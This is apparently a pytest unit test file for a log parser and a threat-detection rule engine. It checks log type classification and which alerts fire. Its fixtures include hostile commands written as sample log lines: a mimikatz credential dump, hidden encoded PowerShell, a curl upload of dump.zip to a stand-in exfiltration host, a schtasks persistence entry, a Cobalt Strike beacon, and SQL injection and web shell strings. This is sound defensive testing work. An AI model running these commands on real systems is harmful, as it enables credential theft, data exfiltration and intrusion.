"""Unit tests for the parser and the (pure) detection rule evaluation."""
import pytest

from services.detector import evaluate_rules
from services.parser import parse_log


def names(raw):
    return {r["name"] for r in evaluate_rules(parse_log(raw))}


def test_parses_key_value_windows_log():
    parsed = parse_log("2024-05-05 10:00:00 PROCESS_CREATE process=mimikatz.exe user=jdoe src_ip=203.0.113.99 event_id=4688 host=PROD-DB-01")
    assert parsed["source_ip"] == "203.0.113.99"
    assert parsed["user"] == "jdoe"
    assert parsed["event_id"] == "4688"
    assert parsed["process"] == "mimikatz.exe"
    assert parsed["hostname"] == "PROD-DB-01"
    assert parsed["log_type"] == "windows"


def test_powershell_sample_is_windows():
    parsed = parse_log("Jan 15 11:45:23 server01 PowerShell[1234]: Invoke-Expression -EncodedCommand dABlAHMAdA== user=SYSTEM event_id=4104")
    assert parsed["log_type"] == "windows"
    assert parsed["user"] == "SYSTEM"
    assert parsed["event_id"] == "4104"


def test_pid_is_not_mistaken_for_event_id():
    assert parse_log("sshd pid=1234 something happened")["event_id"] is None


@pytest.mark.parametrize("raw,expected_type", [
    ("Jan 15 09:12:00 %ASA-2-106001: Inbound TCP connection denied from 203.0.113.50/4444 to 192.168.1.1/80", "cisco"),
    ("Oct 1 12:00:00 auth-server sshd[1000]: Failed password for admin from 198.51.100.7 port 22 ssh2", "linux"),
    ('192.0.2.10 - - [10/Oct/2024:13:55:36 +0000] "GET /index.html HTTP/1.1" 200 2326', "web_server"),
    ("Jan 15 16:22:11 firewall ALLOW src=10.0.0.25 dst=198.51.100.45 port=443", "firewall"),
    ("A generic message mentioning a THREAT word and nothing vendor specific", "unknown"),
])
def test_log_type_classification(raw, expected_type):
    assert parse_log(raw)["log_type"] == expected_type


def test_cisco_ports_and_status():
    parsed = parse_log("Jan 15 09:12:00 %ASA-2-106001: Inbound TCP connection denied from 203.0.113.50/4444 to 192.168.1.1/80 flags SYN")
    assert parsed["source_ip"] == "203.0.113.50"
    assert parsed["dest_ip"] == "192.168.1.1"
    assert parsed["port"] == "80"
    assert parsed["source_port"] == "4444"
    assert parsed["status"] == "DENIED"


def test_ssh_failed_and_success():
    failed = parse_log("sshd[1]: Failed password for invalid user oracle from 198.51.100.7 port 22 ssh2")
    assert failed["status"] == "Failed" and failed["user"] == "oracle" and failed["source_ip"] == "198.51.100.7"
    ok = parse_log("sshd[1]: Accepted password for admin from 198.51.100.7 port 22 ssh2")
    assert ok["status"] == "Success" and ok["user"] == "admin"


@pytest.mark.parametrize("raw,rule", [
    ("process=mimikatz.exe sekurlsa::logonpasswords user=jdoe", "Credential Dumping Attempt"),
    ("powershell.exe -nop -w hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AA==", "Suspicious PowerShell Execution"),
    ("WinEventLog:Security: 1102: The audit log was cleared.", "Event Log Cleared"),
    ("SERVICE_START service=psexecsvc.exe src_ip=203.0.113.99 event_id=7045", "Lateral Movement Detected"),
    ("curl -X POST --data-binary @dump.zip https://exfil.example/upload", "Data Exfiltration Attempt"),
    ("schtasks /create /tn Updater /tr C:\\Temp\\x.exe /sc onlogon", "Persistence Mechanism Detected"),
    ("nmap -sS -p- 10.0.0.0/24", "Reconnaissance Activity"),
    ("rundll32.exe beacon.dll,Start cobalt strike callback", "Command and Control Communication"),
    ("POST /login username=admin' OR '1'='1 src=203.0.113.21", "SQL Injection Attempt"),
    ("POST /uploads file=shell.php src=203.0.113.77 webshell attempt", "Web Shell Upload Attempt"),
    ("Jan 15 16:22:11 firewall ALLOW src=10.0.0.25 dst=8.8.4.4 port=443 bytes=524288000", "Data Exfiltration Attempt"),
])
def test_detection_rules_fire(raw, rule):
    assert rule in names(raw)


@pytest.mark.parametrize("raw", [
    "sshd[2001]: Accepted password for jsmith from 192.168.1.10 port 50001 ssh2",
    "User opened the registry editor settings page",          # 'registry' alone is not persistence
    "Weekly report: 2 incidents, C2C payments processed",     # 'c2' only as a whole word
    "Application started successfully on port 8080",
    "powershell.exe Get-ChildItem C:\\Users",                  # plain PowerShell is not suspicious
])
def test_benign_logs_do_not_fire(raw):
    assert names(raw) == set()


def test_normal_windows_logon_is_not_credential_dumping():
    # Every Windows logon (4624) names lsass.exe as the acting process — that must not alert.
    logon = ("[REAL_LOG] EventID=4624 LogName=Security Message=An account was successfully logged on. "
             "Account Name: j.smith Logon Type: 2 Process Name: C:\\Windows\\System32\\lsass.exe")
    assert "Credential Dumping Attempt" not in names(logon)
    sysmon_target = "EventID=10 SourceImage=C:\\Users\\x\\procdump64.exe TargetImage=C:\\Windows\\system32\\lsass.exe GrantedAccess=0x1fffff"
    assert "Credential Dumping Attempt" in names(sysmon_target)


def test_multi_rule_fire():
    detected = names("powershell -enc SQBFAFgA Invoke-Mimikatz sekurlsa::logonpasswords")
    assert {"Suspicious PowerShell Execution", "Credential Dumping Attempt"} <= detected
